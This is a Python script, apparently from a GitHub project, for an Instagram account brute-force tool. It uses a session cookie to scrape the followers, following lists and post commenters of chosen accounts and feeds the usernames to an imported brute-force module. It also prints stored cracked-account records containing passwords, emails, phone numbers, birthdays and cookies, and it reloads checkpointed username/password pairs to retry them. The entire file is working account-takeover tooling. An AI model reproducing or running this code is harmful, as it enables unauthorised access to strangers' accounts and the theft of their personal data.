#!/usr/bin/env python
# coding: utf-8
# source: https://github.com/khamdihi-dev/Prem

import requests, platform, os, re, time, sys, json
from method import Brute as Bdt_old
from method import ApiKey

A = "\033[90m"   # Abu-abu
B = "\033[94m"   # Biru
C = "\033[96m"   # Cyan
D = "\033[91m"   # Merah Muda (Danger/Red)
E = "\033[95m"   # Ungu
F = "\033[35m"   # Fuchsia (Magenta)
G = "\033[92m"   # Hijau Muda (Green Light)
H = "\033[32m"   # Hijau
I = "\033[30m"   # Hitam
J = "\033[33m"   # Kuning Muda (Yellow)
K = "\033[37m"   # Putih (White - Alternative)
L = "\033[93m"   # Kuning Cerah (Lemon Yellow)
M = "\033[31m"   # Merah
N = "\033[34m"   # Biru Gelap (Navy Blue)
O = "\033[94m"   # Oranye (via Biru karena kode ANSI terbatas)
P = "\033[97m"   # Putih (Bright White)
Q = "\033[41m"   # Latar Merah (Quick Alert)
R = "\033[31m"   # Merah (Red)
S = "\033[36m"   # Cyan Muda (Sky Blue)
T = "\033[96m"   # Teal
U = "\033[35m"   # Ungu (Ungu Magenta)
V = "\033[34m"   # Biru Tua (Violet-ish)
W = "\033[37m"   # Putih
X = "\033[90m"   # Abu-abu Tua
Y = "\033[93m"   # Kuning
Z = "\033[33m"   # Kuning Gelap (Gold)

RESET = "\033[0m"


xx, un = 0, []

class MAIN:

   bersih = lambda xyz, plt: os.system('clear' if plt.lower() == 'linux' else 'cls')
   userid = []
   pk_idg = []

   def __init__(self):
       try:self.bersih(platform.system())
       except:pass
       super(MAIN).__init__()

   def Me(self):
       print(r''' %s_____  _____  _____  _____
/  ___>/     \/  _  \|  _  \  %screate by
|___  ||  |--||  _  <|  |  |  %skhamdihi dev%s
<_____/\_____/\_____/|_____/  %ssimpel bruteforce %sv16.3%s

[%s*%s] Source : %shttps://github.com/khamdihi-dev/Prem.git%s
       '''%(P,P,H,P,P,H,P,H,P,H,P))

   def find_res(self, meki=[]):
       try:
           self.file = os.listdir('data')
           print('\n [ Pilih File Anda ]\n')
           for self.su in self.file:
               if 'ok' not in self.su.lower() or 'cp' in self.su.lower():pass
               else: print('%s[%s+%s] %s'%(P,H,P,self.su))
           self.name = input('\n[%s!%s] Masukan nama file : '%(H,P))
       except Exception as e:exit(e)
       for a in open(f'data/{self.name}','r').read().splitlines():
           xyz = re.findall('ds_user_id=(.*)',str(a))
           if len(xyz) == 0:continue
           else:
                if xyz not in meki:meki.append('ds_user_id=%s'%(xyz[0]))
       if len(meki) == 0:
          exit(f'\n{P}[{M}!{P}] Tidak Bisa menemukan cokie!')
       else:
          for memek in meki:
              try:
                  print(f'\n{P}[{J}!{P}] Mencoba: {H}{memek}')
                  xyz = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
                  uid = re.search('ds_user_id=(\d+)', str(memek)).group(1)
                  req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies={'cookie':memek}).json()['user']['full_name']
                  open('data/IG-login.txt','w').write(f'{memek}')
                  print(f'\n{P}[{J}!{P}] Login sebagai : {req}')
                  time.sleep(2)
                  try:self.bersih(platform.system())
                  except:pass
                  self.insta()
              except Exception as e:
                  print(f'\n{P}{J}!{P}] Expired: J{memek}')

   def aset_ig(self, back=False):
       try:self.bersih(platform.system())
       except:pass
       if os.path.isfile('data/IG-login.txt') is True:
           self.coki = {'cookie':open('data/IG-login.txt','r').read()}
       else:
           self.momo = {'cookie':input('[ Login instagram ]\n\n[?] Masukan cookie : ')}
           if self.momo['cookie'] == 'res':
              self.coki = {'cookie':self.find_res()}
           else:self.coki = self.momo
       try:
           xyz = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
           cek = requests.get('https://www.instagram.com/api/v1/tags/web_info/?tag_name=khmd', headers=xyz,  cookies=self.coki).json()
           uid = re.search('ds_user_id=(\d+)', str(self.coki['cookie'])).group(1)
           req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies=self.coki).json()['user']
           open('data/IG-login.txt','w').write(f'{self.coki["cookie"]}')
       except:
           os.system('rm -rf data/IG-login.txt')
           print('\n[!] Invalid cookie');self.aset_ig()
       try:self.bersih(platform.system())
       except:pass
       if back:return self.coki, req['full_name'], req['follower_count']
       else:exit(os.system(f'python3 {sys.argv[0]}'))

   def insta(self):
       try:self.bersih(platform.system())
       except:pass
       self.aset,self.nama,self.fol = self.aset_ig(True)
       self.Me()
       print(f' {P}• {H}Users Information{P}\n')
       ApiKey.UserKey().konfirkeys()
       print(f'''
[{H}>{P}] Nama      : {H}{self.nama}{P}
[{H}>{P}] Followers : {H}{self.fol}

{P}[{J}1{P}] Dump Followers
{P}[{J}2{P}] Dump Following 
{P}[{J}3{P}] Chek Checkpoin
{P}[{J}4{P}] Dump Komentar
{P}[{J}5{P}] Chek Hasil
{P}[{J}0{P}] Logout\n''')

       self.chs(self.aset)

   def chs(self, assets):
       while True:
         x = input(f'[{H}?{P}] Pilih : ')
         if x in   ['01','1']:self.dumps(assets, True)
         elif x in ['02','2']:self.dumps(assets, False)
         elif x in ['03','3']:self.Ulang()
         elif x in ['04','4']:self.komentar(assets)
         elif x in ['05','5']:self.igrst()
         elif x in ['0']:exit(os.system('rm -rf data/IG-login.txt'))



   def komentar(self, cokie, dav=[]):
       print(f'\n[{H}?{P}] Masukan link postingan atau reels. pisahkan dengan koma')
       link = input(f'[{H}?{P}] Link post : ').split(',')
       try:
           for ling in link:
               self.r = requests.get(ling, cookies=cokie).text
               self.o = re.search('"media_id":"(\d+)"', str(self.r)).group(1)
               dav.append(self.o)
           for self.x in dav:
               self.dump_komen(cokie, self.x, '')
       except:pass
       self.ToolsType()

   def dump_komen(self, cokie, uid, min):
       global xx
       try:
            self.r = requests.get(f"https://i.instagram.com/api/v1/media/{uid}/comments/?can_support_threading=true&permalink_enabled=false&min_id={min}", cookies = cokie, headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',}).json()
            for self.i in self.r['comments']:
                self.a = self.i['user']['username'] +'|'+ self.i['user']['full_name']
                if self.a not in self.pk_idg:
                   self.pk_idg.append(self.a)
                   xx +=1
                   print(f'\r[+] Berhasil dump {xx}',end=' ')
            if 'next_min_id' in str(self.r):
                self.dump_komen(cokie, uid, self.r['next_min_id'])
       except:pass

   def igrst(self):
       print('')
       print(f'[{H}1{P}] Akun OK')
       print(f'[{H}2{P}] Akun CP')
       print(f'[{H}3{P}] Kembali\n')
       while True:
         x = input(f'[{H}?{P}] Pilih : ')
         if x in   ['01','1']:
            try:
                self.file = os.listdir('data')
                print('\n [ Pilih File Anda ]\n')
                for self.su in self.file:
                   if 'ok' not in self.su.lower() or 'cp' in self.su.lower():pass
                   else: print('%s[%s+%s] %s'%(P,H,P,self.su))
                self.name = input('\n[%s!%s] Masukan nama file : '%(H,P))
            except Exception as e:exit(e)
            for a in open(f'data/{self.name}','r').read().splitlines():
                try:
                    dumx = json.loads(a)
                    print(f'''
{P}[{J}*{P}] username : {dumx['username']}
{P}[{J}*{P}] fullname : {dumx['nama']}
{P}[{J}*{P}] password : {dumx['password']}
{P}[{J}*{P}] follower : {dumx['followers']}
{P}[{J}*{P}] folowing : {dumx['following']}
{P}[{J}*{P}] email    : {dumx['email']}
{P}[{J}*{P}] nomor    : {dumx['nomor']}
{P}[{J}*{P}] birthday : {dumx['birthday']}
{P}[{J}*{P}] cookies  : {dumx['cookie']}
''')
                except Exception as e:
                    print(e)
            exit()
         elif x in ['02','2']:
            try:
                self.file = os.listdir('data')
                print('\n [ Pilih File Anda ]\n')
                for self.su in self.file:
                   if 'CP' in self.su:print('%s[%s+%s] %s'%(P,H,P,self.su))
                self.name = input('\n[%s!%s] Masukan nama file : '%(H,P))
            except Exception as e:exit(e)
            for a in open(f'data/{self.name}','r').read().splitlines():
                try:
                    dumx = json.loads(a)
                    print(f'''
{P}[{D}*{P}] username : {dumx['username']}
{P}[{D}*{P}] password : {dumx['password']}
{P}[{D}*{P}] follower : {dumx['followers']}
{P}[{D}*{P}] folowing : {dumx['following']}
{P}[{D}*{P}] feedpost : {dumx['postingan']}
''')
                except Exception as e:
                    print(e)
            exit()

         elif x in ['03','3']:self.insta()

   def Ulang(self):
       try:
          dirs = os.listdir('data')
          if len(dirs) == 0:exit(f'\n{P}[{M}!{P}] File Tidak Ada')
          print('')
          for angka,asu in enumerate(dirs, start=1):
              if 'CP' not in str(asu):pass
              else:print(f' {P}[{J}*{P}] {asu}')
          print(f'\n[{H}!{P}] Masukan Nama file. Jangan Angkanya')
          file = input(f'[{H}?{P}] Nama file : ')
          for rest in open(f'data/{file}','r').read().splitlines():
              try:
                  dumx = json.loads(rest)
                  uid, pas = dumx['username'], dumx['password']
                  self.pk_idg.append(f'{uid}|{pas}')
                  print(f'\r[+] Berhasil dump {len(self.pk_idg)}',end=' ')
              except Exception as e:
                  print(e)
       except (FileNotFoundError,ValueError):
          exit('\n[!] File Tidak Ada Atau Pemisahan Salah.')
       self.ToolsType()

   def dumps(self, cintil, typess, xyz = []):
       if 'csrftoken' not in str(cintil['cookie']):
          try:
              self.memek = requests.get('https://www.instagram.com/data/shared_data/', cookies = cintil).json()
              self.token = self.memek['config']['csrf_token']
              cintil['cookie'] +=';csrftoken=%s;'%(self.token)
          except Exception as e:
              os.system('rm -rf data/IG-login.txt')
              exit(f'\n{P}{J}!{P}] Csrftoken tidak tersedia, dump tidak akan berjalan: {e}')
       print(f'\n[{H}?{P}] Masukan username akun instagram. Pisahkan Dengan Koma')
       users = input(f'[{H}?{P}] Username : ').split(',')
       try:
           for self.y in users:
               req = requests.get(f'https://www.instagram.com/{self.y}/', cookies = cintil).text
               uid = re.search('"user_id":"(\d+)"', str(req)).group(1)
               if uid not in xyz:xyz.append(uid)
       except:pass
       try:
           for kintil in xyz:
               if typess is True:
                  self.Graphql(True, kintil, cintil['cookie'], '')
               else:
                  self.Graphql(False, kintil, cintil['cookie'], '')
       except:pass
       self.ToolsType()

   def Graphql(self, typess, userid, cokie,after):
       global xx
       self.api = "https://www.instagram.com/graphql/query/"
       self.csr = 'variables={"id":"%s","first":200,"after":"%s"}'%(userid,after)
       self.mek = "query_hash=d04b0a864b4b54837c0d870b0e77e076&{}".format(self.csr) if typess is False else "query_hash=c76146de99bb02f6415203be841dd25a&{}".format(self.csr)
       try:
           self.ptk = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","cookie": cokie}
           self.req = requests.get(self.api, params=self.mek, headers=self.ptk).json()
           if 'require_login' in self.req:
               if len(self.pk_idg) > 0:
                  pass
               else:
                  exit(f'\n{P}[{J}!{P}] Invalid Cookie')
           self.khm = 'edge_followed_by' if typess is True else 'edge_follow'
           for self.xyz in self.req['data']['user'][self.khm]['edges']:
               self.xy = self.xyz['node']['username'] + '|' + self.xyz['node']['full_name']
               if self.xy not in self.pk_idg:
                  xx +=1
                  self.pk_idg.append(self.xy)
                  print(f'\r{P}[{J}+{P}] Berhasil dump {H}{xx} {P}id J{userid}',end=' ')
           self.end = self.req['data']['user'][self.khm]['page_info']['has_next_page']
           if self.end is True:
               self.after = self.req['data']['user'][self.khm]['page_info']['end_cursor']
               self.Graphql(typess, userid, cokie, self.after)
           else:pass
       except:pass

   def ToolsType(self):
       exit(Bdt_old.MAIN().List(self.pk_idg))

def ListTools():
    try:MAIN().bersih(platform.system())
    except:pass
    MAIN().insta()

if __name__:
    os.system('git pull')
    ListTools()
